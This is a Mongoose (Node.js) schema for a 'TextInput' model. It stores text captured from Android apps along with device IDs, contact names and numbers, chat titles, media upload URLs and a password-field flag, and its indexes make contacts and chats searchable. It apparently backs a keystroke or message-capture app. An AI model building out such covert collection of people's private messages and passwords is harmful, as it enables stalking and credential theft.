const mongoose = require('mongoose');

const textInputSchema = new mongoose.Schema({
    // Basic identification
    id: {
        type: String,
        required: true,
        unique: true
    },
    timestamp: {
        type: Date,
        required: true,
        default: Date.now
    },
    packageName: {
        type: String,
        required: true
    },
    appName: {
        type: String,
        required: true
    },
    deviceId: {
        type: String,
        required: true
    },
    messageId: {
        type: String,
        default: ''
    },
    
    // ESSENTIAL MESSAGE CONTENT
    text: {
        type: String,
        required: true
    },
    completeMessage: {
        type: String,
        default: ''
    },
    eventType: {
        type: String,
        required: true
    },
    
    // CONTACT & CONVERSATION INFORMATION
    contactName: {
        type: String,
        default: ''
    },
    contactNumber: {
        type: String,
        default: ''
    },
    chatTitle: {
        type: String,
        default: ''
    },
    conversationName: {
        type: String,
        default: ''
    },
    recipientInfo: {
        type: String,
        default: ''
    },
    isGroupChat: {
        type: Boolean,
        default: false
    },
    participantCount: {
        type: Number,
        default: 0
    },
    
    // MEDIA INFORMATION
    hasMedia: {
        type: Boolean,
        default: false
    },
    mediaType: {
        type: String,
        default: ''
    },
    mediaFileName: {
        type: String,
        default: ''
    },
    mediaUploaded: {
        type: Boolean,
        default: false
    },
    mediaDownloadUrl: {
        type: String,
        default: ''
    },
    
    // BASIC UI INFO (minimal)
    isPassword: {
        type: Boolean,
        default: false
    },
    isEditable: {
        type: Boolean,
        default: false
    },
    
    // DEVICE INFO (minimal)
    deviceModel: {
        type: String,
        default: ''
    },
    androidVersion: {
        type: String,
        default: ''
    },
    
    // CUSTOM METADATA (for additional info)
    customMetadata: {
        type: mongoose.Schema.Types.Mixed,
        default: null
    }
}, { timestamps: true });

// Indexes for better performance
textInputSchema.index({ id: 1, deviceId: 1 }, { unique: true });
textInputSchema.index({ packageName: 1, timestamp: 1 });
textInputSchema.index({ deviceId: 1, timestamp: 1 });
textInputSchema.index({ contactName: 1 });
textInputSchema.index({ contactNumber: 1 });
textInputSchema.index({ chatTitle: 1 });

// Pre-save middleware to ensure data integrity
textInputSchema.pre('save', function(next) {
    // Ensure messageId is set if not provided
    if (!this.messageId) {
        this.messageId = `${this.packageName}:${Date.now()}`;
    }
    
    // Ensure completeMessage is built if not provided
    if (!this.completeMessage && this.text) {
        const parts = [`App: ${this.appName}`];
        
        if (this.contactName || this.contactNumber || this.chatTitle) {
            const recipientParts = [];
            if (this.contactName) recipientParts.push(this.contactName);
            if (this.contactNumber) recipientParts.push(this.contactNumber);
            if (this.chatTitle) recipientParts.push(this.chatTitle);
            parts.push(`To: ${recipientParts.join(', ')}`);
        }
        
        parts.push(`Message: ${this.text}`);
        this.completeMessage = parts.join(' | ');
    }
    
    next();
});

const TextInput = mongoose.model('TextInput', textInputSchema);

module.exports = TextInput;